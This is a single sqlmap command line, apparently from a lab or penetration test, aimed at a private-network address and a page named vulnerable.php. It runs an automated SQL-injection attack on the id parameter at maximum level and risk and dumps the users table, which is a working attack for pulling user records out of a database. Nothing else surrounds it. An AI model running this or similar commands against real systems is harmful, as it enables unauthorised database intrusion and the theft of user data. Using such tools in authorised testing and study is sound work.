sqlmap -v 0 --flush-session -u "http://192.168.206.40/vulnerable.php?id=1" -p id --batch --dump -T users --threads=10 --random-agent --level=5 --risk=3
